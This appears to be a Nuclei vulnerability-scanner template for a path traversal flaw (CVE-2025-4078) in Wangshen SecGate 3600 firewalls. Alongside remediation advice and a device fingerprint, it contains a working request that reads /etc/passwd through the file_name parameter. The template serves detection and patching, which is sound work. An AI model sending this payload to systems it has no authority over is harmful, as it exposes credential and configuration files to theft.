id: CVE-2025-4078

info:
  name: Wangshen SecGate 3600 Path Traversal Vulnerability (CVE-2025-4078)
  author: Ark
  severity: medium
  description: |
    Wangshen SecGate 3600 (version 2400) is vulnerable to path traversal through the log_export_file endpoint. The file_name parameter allows attackers to read arbitrary files from the server filesystem.
  impact: |
    Attackers can retrieve sensitive files from the server including configuration files, credentials, and other system data. This can lead to further system compromise.
  remediation: |
    Update Wangshen SecGate 3600 to the latest firmware version that properly validates file paths and implements proper access controls. Restrict access to the management interface.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-4078
    - https://vuldb.com/?id.295954
  metadata:
    verified: true
    max-request: 1
    fofa-query:
      - fid="1Lh1LHi6yfkhiO83I59AYg=="
  tags: cve,cve2025,wangshen,lfi,traversal,vuln

http:
  - raw:
      - |
        GET /?g=log_export_file&file_name=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36


    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - regex("root:.*:0:0:", body)
        condition: and